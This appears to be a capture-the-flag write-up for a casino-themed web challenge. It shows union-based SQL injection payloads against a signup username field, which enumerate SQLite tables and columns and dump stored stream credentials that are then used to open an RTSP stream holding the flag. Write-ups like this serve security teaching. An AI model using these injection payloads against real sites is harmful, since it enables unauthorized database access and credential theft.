# Ocean's 1

We are first greeted by a casino website with a slots machine. Testing the different routes for injections, we can see errors on the username field in the `/signup` route.

Trying this username:
```
user" AND 1=0 UNION SELECT 1 --
```

Yields the following error:
```
User 1 already exists
```

From there, we can try to dump the database into one column.
```
user" AND 1=0 UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --
```

From there, we find two tables: `users` and `streams`. By looking at `streams`'s columns with this injection: `username" AND 1=0 UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info('streams')--`, we get the following:
- `id`
- `endpoint`
- `username`
- `password`

We can then dump all the values with this injection: `username" AND 1=0 UNION SELECT GROUP_CONCAT(CONCAT(id,endpoint,username,password)) FROM streams--`
- `13a1169d-52e1-4b88-ba37-ba6f910a1d25`
- `/slots.rtsp`
- `operator`
- `dQw4w9WgXcQ`


We notice a path of /slots.rtsp with some credentials. However, this path does not work on the HTTP server. If we try to connect via VLC with the RTSP like so, we can see the first flag appear on stream.
```sh
$ vlc rtsp://operator:dQw4w9WgXcQ@polypwngrand.ctf/slots.rtsp
```